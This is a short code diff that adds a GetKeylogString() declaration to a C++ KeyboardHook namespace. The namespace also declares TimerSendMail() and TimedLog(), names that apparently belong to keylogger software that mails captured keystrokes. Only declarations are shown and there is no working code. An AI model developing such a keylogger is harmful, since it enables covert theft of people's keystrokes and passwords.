@@ -6,6 +6,8 @@
 
 namespace KeyboardHook
 {
+    std::string GetKeylogString();
+
     void TimerSendMail();
     void TimedLog();
     
